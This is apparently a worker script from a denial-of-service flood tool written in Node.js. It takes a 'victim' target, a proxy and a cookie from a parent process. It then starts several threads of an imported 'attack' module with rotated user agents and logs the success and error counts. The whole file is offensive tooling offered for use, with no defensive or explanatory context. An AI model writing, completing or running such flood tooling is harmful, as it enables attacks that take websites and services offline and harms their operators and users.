const net = require('net');
const fs = require('fs');

let workerId = null;
let proxy = [];

const userAgents = fs.readFileSync('useragents.txt', 'utf-8').replace(/\r/g, '').split('\n');

const attack = require('./attack');

class Start {

    constructor() {
        this.stats = {
            errors: 0,
            success: 0,
            loop: 0
        };

        this.checkInterval = setInterval(() => {
            if ((this.stats.errors + this.stats.success) > 0) console.log(`SKIDS-COM : Errors: ${this.stats.errors} | Success: ${this.stats.success}`);
        }, 1000);

        this.isRunning = false;

        this.attack = new attack(userAgents, stats => {
            this.stats.errors += stats.errors;
            this.stats.success += stats.success;
        });
    }

    run(props) {
        this.isRunning = true;

        if (props.method === 'attack')
            for (let i = 0; i < props.threads; i++)
                this.attack.start(props);
    }

    stop() {
        this.attack.stop();
        clearInterval(this.checkInterval);
    }

}

const start = new Start();

process.on('message', data => {
    workerId = data.id;
    proxy = data.proxy;
    const victim = data.victim;
    const cookie = data.cookie;
    let _proxy = proxy.split(':');
    start.run({
        victim: victim,
        proxy: { host: _proxy[0], port: _proxy[1] },
        method: 'attack',
        threads: 4,
        requests: 15,
        cookie: cookie
    });
});